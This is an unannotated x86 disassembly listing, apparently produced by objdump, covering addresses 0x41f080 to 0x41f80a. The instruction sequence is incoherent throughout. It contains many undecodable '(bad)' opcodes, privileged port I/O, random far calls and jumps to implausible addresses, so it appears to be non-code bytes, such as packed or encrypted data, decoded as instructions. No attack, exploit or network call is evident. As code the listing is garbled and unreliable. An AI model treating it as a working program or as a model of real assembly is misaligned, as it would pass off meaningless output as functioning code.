  41f080:	mov    eax,0x566a3e85
  41f085:	call   0x76537f0b
  41f08a:	jl     0x41f093
  41f08c:	nop
  41f08d:	fist   WORD PTR [ebp+0x56b4290c]
  41f093:	lock push ebx
  41f095:	es sub al,0xbb
  41f098:	adc    ebp,edi
  41f09a:	mov    dh,al
  41f09c:	xchg   esp,eax
  41f09d:	push   cs
  41f09e:	scas   eax,DWORD PTR es:[edi]
  41f09f:	xchg   BYTE PTR [edx],al
  41f0a1:	dec    ecx
  41f0a2:	test   eax,0x496235d1
  41f0a7:	push   es
  41f0a8:	outs   dx,BYTE PTR ds:[esi]
  41f0a9:	and    ebx,edx
  41f0ab:	dec    eax
  41f0ac:	jnp    0x41f12d
  41f0ae:	jecxz  0x41f0e9
  41f0b0:	das    
  41f0b1:	mov    WORD PTR [ecx+0x5108501d],ss
  41f0b7:	sbb    BYTE PTR [eax],cl
  41f0b9:	pop    edx
  41f0ba:	mov    ebx,0x8ea5e3ff
  41f0bf:	mov    bh,0x54
  41f0c1:	out    dx,al
  41f0c2:	sti    
  41f0c3:	xchg   BYTE PTR [edi],al
  41f0c5:	idiv   DWORD PTR [ebx+0x3b98eb7c]
  41f0cb:	stos   BYTE PTR es:[edi],al
  41f0cc:	scas   al,BYTE PTR es:[edi]
  41f0cd:	jle    0x41f0ba
  41f0cf:	adc    ch,BYTE PTR [eax-0x5da809f8]
  41f0d5:	dec    ebx
  41f0d6:	es sbb al,0xee
  41f0d9:	adc    bh,BYTE PTR [ebx*2-0x667eff]
  41f0e0:	fidiv  WORD PTR [ecx+edx*1]
  41f0e3:	test   eax,0x1866babb
  41f0e8:	pop    eax
  41f0e9:	das    
  41f0ea:	stos   BYTE PTR es:[edi],al
  41f0eb:	into   
  41f0ec:	xor    al,0x86
  41f0ee:	xchg   esp,eax
  41f0ef:	xchg   BYTE PTR [eax+edi*4+0x5c967836],dl
  41f0f6:	lods   al,BYTE PTR ds:[esi]
  41f0f7:	lock xchg DWORD PTR [eax],esp
  41f0fa:	out    dx,eax
  41f0fb:	push   0x47
  41f0fd:	je     0x41f0fe
  41f0ff:	(bad)  
  41f101:	cmp    BYTE PTR gs:[edi],ch
  41f104:	mov    dl,0xd9
  41f106:	imul   esp,ebp,0x31
  41f109:	in     al,dx
  41f10a:	add    DWORD PTR [eax-0x9],0xdb156e4b
  41f111:	les    ebp,FWORD PTR [eax+0x71285d42]
  41f117:	js     0x41f0a9
  41f119:	imul   BYTE PTR [ecx]
  41f11b:	lods   al,BYTE PTR ds:[esi]
  41f11c:	add    BYTE PTR [edx],ah
  41f11e:	cmc    
  41f11f:	dec    ebx
  41f120:	xor    ch,BYTE PTR [ecx]
  41f122:	adc    al,0x98
  41f124:	sti    
  41f125:	imul   edi,DWORD PTR [ecx],0x3
  41f128:	aam    0xc4
  41f12a:	(bad)  
  41f12b:	ficom  DWORD PTR [ebx+ecx*1-0x1666e064]
  41f132:	and    DWORD PTR [esi+0x40e8322f],0xfffffff2
  41f139:	and    BYTE PTR [esi+0x67],0x59
  41f13d:	jns    0x41f18d
  41f13f:	jnp    0x41f135
  41f141:	test   al,0x25
  41f143:	lahf   
  41f144:	xchg   esi,eax
  41f145:	push   ebx
  41f146:	jl     0x41f16c
  41f148:	mov    ds:0x7c8d93ff,al
  41f14d:	imul   ebx,DWORD PTR [ebx-0x1d],0x42ec08a7
  41f154:	ja     0x41f135
  41f156:	ret    
  41f157:	stc    
  41f158:	push   ss
  41f159:	jmp    0x41f184
  41f15b:	or     BYTE PTR [edx+0x11],bh
  41f15e:	mov    dh,0x95
  41f160:	and    al,0x9d
  41f162:	mov    dh,0x22
  41f164:	ret    0x8922
  41f167:	mov    ah,0xff
  41f169:	mov    bh,0xed
  41f16b:	cld    
  41f16c:	int    0x76
  41f16e:	jnp    0x41f101
  41f170:	cwde   
  41f171:	jl     0x41f1d9
  41f173:	mov    ebp,DWORD PTR [eax+0x3]
  41f176:	repnz xor bh,BYTE PTR [edx]
  41f179:	lahf   
  41f17a:	add    BYTE PTR [ecx],0x95
  41f17d:	inc    eax
  41f17e:	or     ch,BYTE PTR [esi+esi*8+0x16a5069a]
  41f185:	jmp    0xe9f0:0xeb276c6c
  41f18c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f18d:	mov    esp,0xb7c34ca1
  41f192:	shr    dl,cl
  41f194:	push   ebp
  41f195:	push   0xffffffbf
  41f197:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f198:	rcl    DWORD PTR [ecx+0x6a1a545d],cl
  41f19e:	rcr    DWORD PTR [esi-0x66],1
  41f1a1:	aad    0x94
  41f1a3:	mov    BYTE PTR [esi+0x373d2e64],ch
  41f1a9:	fild   DWORD PTR [ecx-0x2]
  41f1ac:	dec    ebp
  41f1ad:	add    DWORD PTR [eax],eax
  41f1af:	adc    BYTE PTR [esi],al
  41f1b1:	in     al,dx
  41f1b2:	fidiv  WORD PTR [eax]
  41f1b4:	fidiv  DWORD PTR [edx+ebp*4+0x400ac437]
  41f1bb:	pop    ss
  41f1bc:	stc    
  41f1bd:	jp     0x41f1d9
  41f1bf:	xchg   edx,eax
  41f1c0:	mov    eax,ds:0x6ec6c5ae
  41f1c5:	pop    ss
  41f1c6:	jle    0x41f156
  41f1c8:	mov    dl,0x1b
  41f1ca:	mov    DWORD PTR [esp+ecx*4-0x697f51],edx
  41f1d1:	dec    edi
  41f1d2:	jmp    0x41f24b
  41f1d4:	fs cld 
  41f1d6:	sbb    BYTE PTR [eax],ah
  41f1d8:	mov    edx,0xf31fc2c1
  41f1dd:	inc    edi
  41f1de:	out    dx,al
  41f1df:	pop    edi
  41f1e0:	repnz add DWORD PTR [edx],edx
  41f1e3:	add    eax,0xee5fa9d1
  41f1e8:	aad    0x87
  41f1ea:	push   eax
  41f1eb:	out    dx,eax
  41f1ec:	inc    esp
  41f1ed:	hlt    
  41f1ee:	and    al,0x4d
  41f1f0:	int3   
  41f1f1:	xchg   ebp,eax
  41f1f2:	scas   al,BYTE PTR es:[edi]
  41f1f3:	pop    ss
  41f1f4:	and    eax,0x1027767a
  41f1f9:	mov    bl,0x5e
  41f1fb:	fisttp QWORD PTR [eax-0x73]
  41f1fe:	mov    edi,0x7151fcfa
  41f203:	test   ebp,ebp
  41f205:	pop    es
  41f206:	mov    esp,0x4365a3fe
  41f20b:	popf   
  41f20c:	call   FWORD PTR [edx]
  41f20e:	mov    bh,BYTE PTR [ecx-0x30]
  41f211:	mov    bh,bl
  41f213:	xchg   ebp,eax
  41f214:	and    BYTE PTR [eax],bh
  41f216:	jb     0x41f24c
  41f218:	imul   esi,ecx,0xfa1244d
  41f21e:	ffree  st(7)
  41f220:	ficomp WORD PTR [edi+0x135f5f7]
  41f226:	ja     0x41f239
  41f228:	push   ebp
  41f229:	xchg   esi,eax
  41f22a:	dec    ecx
  41f22b:	push   ss
  41f22c:	mov    bh,0xf8
  41f22e:	push   es
  41f22f:	xchg   esp,eax
  41f230:	outs   dx,DWORD PTR ds:[esi]
  41f231:	sar    DWORD PTR [edx-0x2f],0x60
  41f235:	in     eax,dx
  41f236:	xchg   BYTE PTR [eax+0x5c],bl
  41f239:	mov    bl,0xba
  41f23b:	push   es
  41f23c:	rol    BYTE PTR [edi+0x84e02f2],0x9a
  41f243:	and    esi,edi
  41f245:	push   esp
  41f246:	xchg   esi,eax
  41f247:	xchg   esp,eax
  41f248:	int3   
  41f249:	es jbe 0x41f1dc
  41f24c:	dec    ebp
  41f24d:	arpl   WORD PTR [edx],sp
  41f24f:	xchg   ecx,eax
  41f250:	jnp    0x41f2c9
  41f252:	mov    eax,ds:0x196368cb
  41f257:	test   eax,0x209b6e42
  41f25c:	call   0x1548:0xaf467480
  41f263:	sbb    BYTE PTR [ebx-0x7f930896],bh
  41f269:	and    DWORD PTR [ebx-0x21],edi
  41f26c:	add    al,0x5d
  41f26e:	push   ds
  41f26f:	(bad)  
  41f270:	enter  0x5a4b,0x92
  41f274:	mov    bh,0x25
  41f276:	push   0xffffff8e
  41f278:	sbb    eax,0x5e825d5c
  41f27d:	js     0x41f21f
  41f27f:	(bad)  [ebp-0x240a6ef2]
  41f285:	cmc    
  41f286:	adc    eax,0xb7dd7a8
  41f28b:	js     0x41f2e0
  41f28d:	mov    ds:0x1fc65b41,eax
  41f292:	add    DWORD PTR [edx],ecx
  41f294:	push   0x9e79159
  41f299:	jecxz  0x41f312
  41f29b:	push   edx
  41f29c:	mov    ch,0x4f
  41f29e:	xor    al,0xc
  41f2a0:	stos   BYTE PTR es:[edi],al
  41f2a1:	or     bl,dl
  41f2a3:	mov    dl,0x93
  41f2a5:	pop    eax
  41f2a6:	loope  0x41f2ac
  41f2a8:	scas   al,BYTE PTR es:[edi]
  41f2a9:	adc    dh,BYTE PTR [edi-0x14620003]
  41f2af:	repnz in al,0xa6
  41f2b2:	push   ebp
  41f2b3:	xor    al,0xe0
  41f2b5:	(bad)  
  41f2b6:	mov    ah,0xe4
  41f2b8:	push   cs
  41f2b9:	icebp  
  41f2ba:	mov    ebx,0x665b7134
  41f2bf:	sti    
  41f2c0:	pop    ebx
  41f2c1:	add    DWORD PTR [ebx],ecx
  41f2c3:	lods   eax,DWORD PTR ds:[esi]
  41f2c4:	xchg   edi,eax
  41f2c5:	mov    ah,0x7
  41f2c7:	xchg   esi,eax
  41f2c8:	cmp    dh,al
  41f2ca:	or     DWORD PTR [edi+0x30],ebp
  41f2cd:	push   esi
  41f2ce:	sub    eax,0xa2374ade
  41f2d3:	pusha  
  41f2d4:	popa   
  41f2d5:	aas    
  41f2d6:	int    0x59
  41f2d8:	pushf  
  41f2d9:	imul   ebx,esi,0xf0475c1f
  41f2df:	jb     0x41f2a2
  41f2e1:	pop    edx
  41f2e2:	(bad)  
  41f2e3:	(bad)  
  41f2e4:	repz sub al,0x67
  41f2e7:	adc    DWORD PTR [edi+0xf3f7f10],ebp
  41f2ed:	je     0x41f29b
  41f2ef:	ds popf 
  41f2f1:	mov    al,ds:0xae8a1e6c
  41f2f6:	test   ebx,0x21ea1826
  41f2fc:	out    0x2d,eax
  41f2fe:	or     ah,ch
  41f300:	outs   dx,BYTE PTR ds:[esi]
  41f301:	push   edx
  41f302:	or     ecx,ecx
  41f304:	(bad)  
  41f305:	fisub  DWORD PTR [ebp-0x1a]
  41f308:	jae    0x41f2b1
  41f30a:	sub    al,0xf9
  41f30c:	push   ecx
  41f30d:	adc    ah,bl
  41f30f:	mov    ss,WORD PTR [ecx]
  41f311:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f313:	fsub   QWORD PTR [eax+0x4d]
  41f316:	mov    DWORD PTR [ecx+0x3e0212a7],esi
  41f31c:	mov    eax,ds:0x619b1f50
  41f321:	and    BYTE PTR [ebp+0x616b7c57],ch
  41f327:	pop    DWORD PTR [ebx-0x1c0f418a]
  41f32d:	adc    al,0x8c
  41f32f:	adc    ecx,esi
  41f331:	(bad)  
  41f332:	adc    ch,BYTE PTR [edi-0xd2e3172]
  41f338:	xor    eax,eax
  41f33a:	dec    edi
  41f33b:	push   cs
  41f33c:	into   
  41f33d:	xor    BYTE PTR [edx+ebp*1],0xc9
  41f341:	xchg   esp,eax
  41f342:	mov    ah,0xac
  41f344:	rcl    BYTE PTR [esp+eax*4-0x50c8631],0xff
  41f34c:	test   DWORD PTR [edi],esp
  41f34e:	mul    bl
  41f350:	aaa    
  41f351:	add    ecx,DWORD PTR [ecx+0x7]
  41f354:	adc    DWORD PTR [edx+0x5fbbd9ee],edx
  41f35a:	idiv   DWORD PTR [edx]
  41f35c:	ds inc esp
  41f35e:	popf   
  41f35f:	and    eax,DWORD PTR [ecx-0xc]
  41f362:	push   esi
  41f363:	jge    0x41f32b
  41f365:	adc    DWORD PTR [edx+ecx*2+0x2f89868],0x4c
  41f36d:	jns    0x41f34c
  41f36f:	dec    ebp
  41f370:	and    al,dh
  41f372:	adc    eax,0x843f1ed4
  41f377:	lock sbb DWORD PTR [ecx+eax*4],esp
  41f37b:	cmp    eax,0x5b53641e
  41f380:	call   DWORD PTR [esp+edi*4-0x40]
  41f384:	and    bl,ah
  41f386:	xchg   edx,eax
  41f387:	cmp    eax,0xec371cdf
  41f38c:	push   cs
  41f38d:	push   ecx
  41f38e:	pop    ecx
  41f38f:	and    bl,BYTE PTR [ecx+eiz*2+0x1b]
  41f393:	pop    ebx
  41f394:	rcr    edx,0xce
  41f397:	xchg   BYTE PTR [edx],dh
  41f399:	push   ecx
  41f39a:	jns    0x41f3ab
  41f39c:	mov    esi,0xf465275c
  41f3a1:	stc    
  41f3a2:	add    DWORD PTR cs:[esi+0x5c],0x6fdbea57
  41f3aa:	xchg   esi,eax
  41f3ab:	inc    ebp
  41f3ac:	xchg   edx,eax
  41f3ad:	xchg   BYTE PTR [ebp-0xc1c6141],bl
  41f3b3:	ffree  st(3)
  41f3b5:	and    al,0x73
  41f3b7:	and    eax,esi
  41f3b9:	mov    edx,0x7b01097
  41f3be:	xor    edx,DWORD PTR [ecx-0x7891824f]
  41f3c4:	int3   
  41f3c5:	cmp    al,BYTE PTR [ebx-0x6440b324]
  41f3cb:	push   0xa651a3d3
  41f3d0:	and    DWORD PTR [edx],eax
  41f3d2:	xor    eax,0x6e61afd0
  41f3d7:	mov    edi,0xb35356a9
  41f3dc:	(bad)  
  41f3dd:	mov    WORD PTR [edi-0x4fc8e50b],es
  41f3e3:	shl    DWORD PTR [ecx+0x60fb88d3],cl
  41f3e9:	inc    DWORD PTR [eax]
  41f3eb:	jae    0x41f46a
  41f3ed:	fwait
  41f3ee:	dec    ebx
  41f3ef:	in     al,dx
  41f3f0:	fs (bad) 
  41f3f2:	or     al,0xd0
  41f3f4:	add    edx,DWORD PTR [esi+0x10a6394f]
  41f3fa:	dec    ecx
  41f3fb:	(bad)  
  41f3fc:	rol    BYTE PTR [ebx+0x13b11ac7],cl
  41f402:	adc    al,dl
  41f404:	add    edx,DWORD PTR [eax-0x14]
  41f407:	xor    esp,DWORD PTR [edx]
  41f409:	and    bh,0x8f
  41f40c:	gs fwait
  41f40e:	push   ds
  41f40f:	cmp    DWORD PTR [eax],0xffffffa5
  41f412:	sub    ebp,ebp
  41f414:	push   esi
  41f415:	clc    
  41f416:	aas    
  41f417:	ins    BYTE PTR es:[edi],dx
  41f418:	fisubr DWORD PTR [edx]
  41f41a:	jne    0x41f44c
  41f41c:	sbb    esi,DWORD PTR [eax-0x58]
  41f41f:	div    BYTE PTR [ebx+0x1d]
  41f422:	inc    edi
  41f423:	mov    ebp,0x5fcb7dd3
  41f428:	aaa    
  41f429:	xchg   esp,eax
  41f42a:	test   al,0x22
  41f42c:	or     BYTE PTR [edi],0xd7
  41f42f:	out    dx,eax
  41f430:	fs clc 
  41f432:	push   edi
  41f433:	sbb    ch,BYTE PTR [esi-0x27]
  41f436:	dec    edx
  41f437:	shl    DWORD PTR [edi],0xe8
  41f43a:	adc    DWORD PTR [ecx],0x1bae1ca4
  41f440:	jecxz  0x41f4ba
  41f442:	rcr    BYTE PTR [ebx],1
  41f444:	fld    TBYTE PTR [esi]
  41f446:	int3   
  41f447:	sub    BYTE PTR [ebp-0x1db796bc],cl
  41f44d:	outs   dx,DWORD PTR ds:[esi]
  41f44e:	(bad)  
  41f44f:	(bad)  
  41f451:	sub    DWORD PTR [esi],0x44
  41f454:	jae    0x41f462
  41f456:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f457:	and    dh,BYTE PTR [esi+edi*8+0x6b911f6a]
  41f45e:	out    dx,al
  41f45f:	jno    0x41f43b
  41f461:	ss call 0x4680:0xc0b0e6c7
  41f469:	sbb    al,0xd2
  41f46b:	and    esp,DWORD PTR [ebx]
  41f46d:	test   al,0x4f
  41f46f:	or     esi,DWORD PTR [edi+0xb]
  41f472:	retf   
  41f473:	sub    DWORD PTR [ecx+0x36],ebp
  41f476:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f478:	cmp    DWORD PTR [eax],edi
  41f47a:	xchg   ecx,eax
  41f47b:	mov    ebx,0x379f844d
  41f480:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f481:	push   ds
  41f482:	mov    ?,esp
  41f484:	mov    ecx,DWORD PTR [edx]
  41f486:	fst    st(3)
  41f488:	pop    ebp
  41f489:	mov    gs,WORD PTR [edx+0x649a7805]
  41f48f:	add    edx,edi
  41f491:	xchg   esi,eax
  41f492:	in     eax,dx
  41f493:	jmp    FWORD PTR [edi*2-0x755237ea]
  41f49a:	pop    esi
  41f49b:	mov    esi,cs
  41f49d:	xor    al,0xe2
  41f49f:	dec    ecx
  41f4a0:	mov    dl,0xe7
  41f4a2:	cmp    al,0x8c
  41f4a4:	xor    DWORD PTR [ecx-0x15fd05c0],eax
  41f4aa:	add    ah,bl
  41f4ac:	(bad)  
  41f4ae:	or     eax,0x7099f85
  41f4b3:	mov    cl,BYTE PTR [esi-0x6c2e4e50]
  41f4b9:	cmp    dh,BYTE PTR [ebp-0x67279fff]
  41f4bf:	lea    esp,[edi]
  41f4c1:	(bad)  
  41f4c2:	push   ebp
  41f4c3:	or     al,0xed
  41f4c5:	mov    eax,0x37586504
  41f4ca:	pop    edi
  41f4cb:	cld    
  41f4cc:	jae    0x41f534
  41f4ce:	inc    esp
  41f4cf:	popa   
  41f4d0:	mov    ebp,0x31378383
  41f4d5:	fimul  DWORD PTR [eax+0x27]
  41f4d9:	(bad)  
  41f4da:	push   eax
  41f4db:	shl    DWORD PTR [edi-0x1d28f24e],0x4e
  41f4e2:	retf   0xc7d1
  41f4e5:	sub    cl,BYTE PTR [ecx-0x4332e9ee]
  41f4eb:	inc    ecx
  41f4ec:	pop    ss
  41f4ed:	int3   
  41f4ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4ef:	stos   DWORD PTR es:[edi],eax
  41f4f0:	xor    dh,BYTE PTR [edi-0x1e]
  41f4f3:	mov    fs,WORD PTR [ecx]
  41f4f5:	loope  0x41f517
  41f4f7:	push   ebx
  41f4f8:	repz mov edx,0x686354ad
  41f4fe:	jp     0x41f4be
  41f500:	outs   dx,DWORD PTR ds:[esi]
  41f501:	push   ebx
  41f502:	sub    esp,edx
  41f504:	or     DWORD PTR [esi],edi
  41f506:	mov    esi,0xca83df05
  41f50b:	rcl    BYTE PTR [ecx],cl
  41f50d:	xchg   DWORD PTR [eax],esp
  41f50f:	sti    
  41f510:	lea    esi,[edx-0x745a96a3]
  41f516:	dec    eax
  41f517:	cdq    
  41f518:	sbb    DWORD PTR [edx-0xd],ecx
  41f51b:	push   ebp
  41f51c:	adc    BYTE PTR [esp+eiz*4-0x5],bl
  41f520:	jl     0x41f4e9
  41f522:	mov    al,ds:0x842b450
  41f527:	(bad)  
  41f529:	inc    esi
  41f52a:	pop    esp
  41f52b:	push   0x26f414c3
  41f530:	mov    gs,WORD PTR [eax+esi*8+0x32]
  41f534:	jne    0x41f4c8
  41f536:	xchg   BYTE PTR [esi],cl
  41f538:	mov    ecx,0xbbc32c8a
  41f53d:	les    esi,FWORD PTR [eax+0x1c658c81]
  41f543:	shl    DWORD PTR es:[esi+esi*1],1
  41f547:	cwde   
  41f548:	dec    ecx
  41f549:	hlt    
  41f54a:	hlt    
  41f54b:	ja     0x41f517
  41f54d:	jg     0x41f4e9
  41f54f:	mov    ebp,fs
  41f551:	jg     0x41f4d7
  41f553:	mov    al,ds:0x9d47c193
  41f558:	out    0xd,eax
  41f55a:	nop
  41f55b:	xlat   BYTE PTR ds:[ebx]
  41f55c:	xor    ah,BYTE PTR [ecx+0x2e8884a0]
  41f562:	(bad)
  41f567:	retf   
  41f568:	inc    edi
  41f569:	cmp    ecx,ebx
  41f56b:	mov    dh,BYTE PTR [ebp-0x10]
  41f56e:	rcl    esp,cl
  41f570:	xor    BYTE PTR ds:0x59fdfed6,0x1c
  41f577:	jmp    0xe2bca799
  41f57c:	shr    DWORD PTR [ecx],1
  41f57e:	stc    
  41f57f:	bound  esi,QWORD PTR [edi]
  41f581:	stc    
  41f582:	fwait
  41f583:	sbb    ah,BYTE PTR [ebp+0x6bc4f5b8]
  41f589:	fcom   DWORD PTR [ebx-0x58]
  41f58c:	test   DWORD PTR ds:0xbb5ef9ca,esp
  41f592:	inc    esp
  41f593:	adc    ebx,DWORD PTR [esi+0x21]
  41f596:	cmp    ch,BYTE PTR [ebx]
  41f598:	mov    esi,0x87a97e98
  41f59d:	pusha  
  41f59e:	lds    esp,FWORD PTR [ecx+ebx*4]
  41f5a1:	add    edx,DWORD PTR [edx-0x148bcfe3]
  41f5a7:	out    dx,eax
  41f5a8:	stos   DWORD PTR es:[edi],eax
  41f5a9:	fidiv  DWORD PTR [esi-0x2c]
  41f5ac:	and    al,0xab
  41f5ae:	add    al,0x27
  41f5b0:	xor    DWORD PTR [edx-0x78baba11],ebp
  41f5b6:	mov    esp,0x8a8ba60
  41f5bb:	mov    bh,0x2a
  41f5bd:	mov    ebx,0x57b6e152
  41f5c2:	test   al,0x52
  41f5c4:	lds    ecx,FWORD PTR [edi-0x6f6f69a1]
  41f5ca:	dec    ebx
  41f5cb:	xor    dh,dh
  41f5cd:	jo     0x41f642
  41f5cf:	dec    edi
  41f5d0:	call   0xdd4c:0x9970a248
  41f5d7:	cmp    al,BYTE PTR [edx]
  41f5d9:	in     al,0xc0
  41f5db:	mov    ch,0x3c
  41f5dd:	sbb    DWORD PTR [edi-0x217fcc3c],0x23
  41f5e4:	xchg   ebx,eax
  41f5e5:	hlt    
  41f5e6:	jb     0x41f654
  41f5e8:	ret    0xe243
  41f5eb:	adc    BYTE PTR [ebp-0x77],bh
  41f5ee:	jmp    0xfc4b:0x1a3c473e
  41f5f5:	sbb    BYTE PTR [edx-0x25],dh
  41f5f8:	fisttp QWORD PTR ss:[ebx-0x708d451d]
  41f5ff:	enter  0x9635,0xc3
  41f603:	aam    0x3c
  41f605:	lock fimul DWORD PTR [edx+0x2834696c]
  41f60c:	iret   
  41f60d:	ja     0x41f654
  41f60f:	sub    al,0xb6
  41f611:	jge    0x41f5d9
  41f613:	dec    ebp
  41f614:	test   DWORD PTR [edx],edx
  41f616:	mov    ebp,0x96cfa539
  41f61b:	(bad)  
  41f61c:	mov    esi,0x9987debe
  41f621:	pushf  
  41f622:	cmp    al,0xe3
  41f624:	inc    eax
  41f625:	pop    ds
  41f626:	sub    al,0xc6
  41f628:	popf   
  41f629:	test   al,0x63
  41f62b:	lea    ebx,[ecx+0x3e61f078]
  41f631:	loopne 0x41f5c5
  41f633:	sbb    eax,0x53784c4d
  41f638:	lea    esp,[edi]
  41f63a:	(bad)  
  41f63b:	cmovne ebp,DWORD PTR ds:0x1622f5fb
  41f642:	icebp  
  41f643:	(bad)  
  41f644:	jg     0x41f5d8
  41f646:	or     al,0x3c
  41f648:	fdivr  QWORD PTR [ebx+eiz*8]
  41f64b:	mov    dl,0x9d
  41f64d:	lea    ebp,[eax-0xa9c1e25]
  41f653:	xor    ebp,eax
  41f655:	call   0xf3a6115c
  41f65a:	out    0x97,eax
  41f65c:	push   edi
  41f65d:	mov    al,0x97
  41f65f:	mov    cl,BYTE PTR [ebx]
  41f661:	les    ecx,FWORD PTR [esi]
  41f663:	adc    BYTE PTR [ebp-0x51],cl
  41f666:	push   edi
  41f667:	dec    ebx
  41f668:	mov    BYTE PTR [esi+0x23d137a5],ah
  41f66e:	not    dl
  41f670:	push   edx
  41f671:	or     BYTE PTR [eax+0x641670ee],0xae
  41f678:	jno    0x41f614
  41f67a:	cmp    BYTE PTR [ecx],ah
  41f67c:	xchg   edi,eax
  41f67d:	add    al,0x1d
  41f67f:	xor    BYTE PTR [ebp-0x7],0x16
  41f683:	and    BYTE PTR [esi+0xc],al
  41f686:	jns    0x41f6e4
  41f688:	push   esi
  41f689:	mov    cl,0x46
  41f68b:	mov    dh,0xf7
  41f68d:	jle    0x41f664
  41f68f:	outs   dx,DWORD PTR ds:[esi]
  41f690:	or     bl,BYTE PTR [eax-0x42]
  41f693:	test   BYTE PTR [edx-0xe349c17],dl
  41f699:	push   esp
  41f69a:	imul   eax,DWORD PTR [edx-0x6a3857a6],0xb10bc7a5
  41f6a4:	xchg   ebx,eax
  41f6a5:	lods   al,BYTE PTR ds:[esi]
  41f6a6:	daa    
  41f6a7:	and    DWORD PTR [ecx-0x58],edx
  41f6aa:	and    ebp,DWORD PTR [edx+0x6b9ea669]
  41f6b0:	mov    es,WORD PTR [ebx-0xb]
  41f6b3:	aad    0x8
  41f6b5:	rcr    DWORD PTR [edx-0x49],cl
  41f6b8:	and    BYTE PTR [ecx+0x8],bh
  41f6bb:	popa   
  41f6bc:	leave  
  41f6bd:	gs xor al,0x70
  41f6c0:	fs and ah,0xd4
  41f6c4:	leave  
  41f6c5:	inc    esi
  41f6c6:	cwde   
  41f6c7:	cld    
  41f6c8:	pop    es
  41f6c9:	lahf   
  41f6ca:	call   ebx
  41f6cc:	rol    BYTE PTR [ebx],1
  41f6ce:	mov    ah,0xe
  41f6d0:	into   
  41f6d1:	gs sub cl,bh
  41f6d4:	mov    ds:0xfbd425e0,al
  41f6d9:	push   0xc1bb6f3
  41f6de:	mov    ebp,0x2a35143
  41f6e3:	(bad)  
  41f6e5:	retf   
  41f6e6:	aad    0xab
  41f6e8:	jp     0x41f724
  41f6ea:	pop    ebp
  41f6eb:	call   0x28b7d59
  41f6f0:	hlt    
  41f6f1:	aaa    
  41f6f2:	aaa    
  41f6f3:	stos   DWORD PTR es:[edi],eax
  41f6f4:	in     al,dx
  41f6f5:	imul   eax,DWORD PTR [ecx],0x86516bf4
  41f6fb:	sbb    edi,DWORD PTR [edx]
  41f6fd:	inc    eax
  41f6fe:	div    BYTE PTR [ebp+0x53]
  41f701:	out    0xe0,eax
  41f703:	mov    WORD PTR [esi-0x3a763ee4],cs
  41f709:	fsub   st(6),st
  41f70b:	shr    BYTE PTR [esi+0x35],cl
  41f70e:	mov    esp,0x8c21105
  41f713:	and    DWORD PTR [ebx+0x7da03a53],ecx
  41f719:	dec    ebp
  41f71a:	pop    ecx
  41f71b:	adc    dh,BYTE PTR [ebp-0x61daf106]
  41f721:	adc    eax,0x40eaee7e
  41f726:	fcom   DWORD PTR [edi]
  41f728:	push   edx
  41f729:	popa   
  41f72a:	scas   al,BYTE PTR es:[edi]
  41f72b:	dec    DWORD PTR [edi+0x4e]
  41f72e:	jns    0x41f6cd
  41f730:	dec    esp
  41f731:	xor    ebp,ebx
  41f733:	leave  
  41f734:	jl     0x41f6c3
  41f736:	pop    edi
  41f737:	rcr    BYTE PTR [ebx+0x6c1d6947],0xb2
  41f73e:	iret   
  41f73f:	mov    eax,0xb9df52d4
  41f744:	xor    WORD PTR ds:[esi],bp
  41f748:	arpl   bx,ax
  41f74a:	push   esp
  41f74b:	cmp    eax,0xa310e4a5
  41f750:	fwait
  41f751:	push   esi
  41f752:	push   ebp
  41f753:	rcl    DWORD PTR [edi],cl
  41f755:	jl     0x41f73e
  41f757:	icebp  
  41f758:	cmp    dl,al
  41f75a:	ret    0x70e1
  41f75d:	test   DWORD PTR [ebp-0x62fd3c0],0x890e3bb4
  41f767:	loopne 0x41f7cc
  41f769:	push   ecx
  41f76a:	inc    eax
  41f76b:	iret   
  41f76c:	push   ebx
  41f76d:	xor    BYTE PTR [ebx],cl
  41f76f:	cmp    BYTE PTR fs:[edi+0x67114491],dl
  41f776:	popf   
  41f777:	cmp    ecx,esi
  41f779:	lods   eax,DWORD PTR ds:[esi]
  41f77a:	cld    
  41f77b:	sub    al,0x2e
  41f77d:	leave  
  41f77e:	inc    ebx
  41f77f:	jg     0x41f73d
  41f781:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f782:	pop    es
  41f783:	pop    edx
  41f784:	(bad)  
  41f785:	cli    
  41f786:	dec    esp
  41f787:	clc    
  41f788:	adc    eax,0xb9c6e6b4
  41f78d:	xchg   ebp,eax
  41f78e:	xchg   esp,eax
  41f78f:	aam    0xd
  41f791:	call   0x61efa7cc
  41f796:	fdivr  DWORD PTR [edx+0x7c4936f7]
  41f79c:	lds    ecx,FWORD PTR [ecx+0x28]
  41f79f:	int    0x47
  41f7a1:	gs mov eax,0xf4fcf40f
  41f7a7:	dec    edx
  41f7a8:	shl    DWORD PTR [esi+0x8],0xfd
  41f7ac:	mov    BYTE PTR [ecx+0x271b26cd],al
  41f7b2:	into   
  41f7b3:	repz inc edi
  41f7b5:	or     bl,0xe7
  41f7b8:	in     eax,0xd9
  41f7ba:	dec    eax
  41f7bb:	js     0x41f757
  41f7bd:	icebp  
  41f7be:	ficom  WORD PTR [esi]
  41f7c0:	xchg   esp,eax
  41f7c1:	ss push cs
  41f7c3:	scas   eax,DWORD PTR es:[edi]
  41f7c4:	clc    
  41f7c5:	dec    esi
  41f7c6:	jae    0x41f7d1
  41f7c8:	int3   
  41f7c9:	add    eax,0x347d70f6
  41f7ce:	sbb    al,0x11
  41f7d0:	cmp    BYTE PTR [eax+0x735052fd],ch
  41f7d6:	call   0x79f0:0x262f7574
  41f7dd:	aad    0xb8
  41f7df:	jmp    0x41f826
  41f7e1:	jne    0x41f7c4
  41f7e3:	ja     0x41f80e
  41f7e5:	js     0x41f7ac
  41f7e7:	sub    ebp,edi
  41f7e9:	add    ah,cl
  41f7eb:	jmp    0x400675cb
  41f7f0:	rcl    eax,cl
  41f7f2:	sub    DWORD PTR [eax+0x7f],ebx
  41f7f5:	add    ebp,DWORD PTR [ecx+0x514bd311]
  41f7fb:	sub    DWORD PTR [esi],0xf1de2c69
  41f801:	std    
  41f802:	loop   0x41f858
  41f804:	mov    dh,BYTE PTR [edx-0x4d]
  41f807:	dec    ebx
  41f808:	jmp    0x41f7a7
  41f80a:	fist   DWORD PTR [ecx]
